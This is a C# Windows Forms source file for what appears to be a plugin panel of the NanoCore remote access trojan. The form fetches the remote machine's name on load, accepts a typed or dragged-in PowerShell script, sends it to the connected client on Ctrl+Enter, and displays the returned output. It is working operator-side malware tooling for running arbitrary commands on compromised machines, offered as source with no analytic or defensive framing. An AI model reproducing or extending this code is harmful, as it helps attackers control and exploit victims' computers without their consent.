using System.IO;
using System.Windows.Forms;
using NanoCore;

namespace PowershellRunnerServer
{
	public partial class RunnerForm : Form
	{
		private IClient Client;

		public RunnerForm(IClient _client)
		{
			InitializeComponent();

			Client = _client;
		}

		public void AppendResult(string result)
		{
			this.Invoke(new MethodInvoker(
				delegate ()
				{
					txtResult.AppendText(result);
					txtResult.ScrollToCaret();
					txtScriptText.Enabled = true;
					txtScriptText.Select();
					txtScriptText.Focus();
				}));
		}

		private void RunnerForm_Load(object sender, System.EventArgs e)
		{
			CommandHandler.SendGetMachineName(Client);
		}

		private void txtScriptText_DragDrop(object sender, DragEventArgs e)
		{
			if (e.Data.GetDataPresent(DataFormats.FileDrop))
			{
				string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);
				txtScriptText.Text = File.ReadAllText(files[0]);
			}
		}

		private void txtScriptText_DragEnter(object sender, DragEventArgs e)
		{
			if (e.Data.GetDataPresent(DataFormats.FileDrop))
				e.Effect = DragDropEffects.Link;
			else
				e.Effect = DragDropEffects.None;
		}

		private void txtScriptText_KeyDown(object sender, KeyEventArgs e)
		{
			if (e.Control && e.KeyCode == Keys.Enter)
			{
				txtScriptText.Enabled = false;
				CommandHandler.SendScriptText(Client, txtScriptText.Text);
				e.SuppressKeyPress = true;
			}
		}
	}
}